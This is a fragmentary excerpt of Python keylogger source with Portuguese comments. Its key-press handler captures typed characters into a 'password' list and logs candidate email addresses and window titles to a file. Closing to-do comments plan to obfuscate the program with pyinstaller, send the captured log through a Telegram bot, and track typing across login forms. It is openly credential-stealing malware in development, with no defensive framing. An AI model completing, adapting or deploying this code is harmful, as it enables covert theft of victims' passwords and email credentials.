    ...
    def se_press(self, key):  # busca por teclas pressionadas
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.senha.append(key.char)  # se for uma tecla pressionada -> adicionar à senha
        ...
        if (not self.eh_email_valido(palavra) and
            ...
            self.salvar_em_arquivo(f"[Alerta: caractere especial detectado] - Janela: {janela}")
            ...
            if palavra:
                if self.eh_formato_email(palavra):
                    if self.eh_email_valido(palavra):
                        ...
                        self.salvar_em_arquivo(f"[POSSIVEL EMAIL] {palavra}")
...
# usar um ofuscador junto do pyinstaller (para testar);
# criar um bot no telegram pra enviar o log; 
# fazer com que detecte digitação continua (em logins modernos, vc é direcionado automaticamente pro senha ou pra outras informações.)g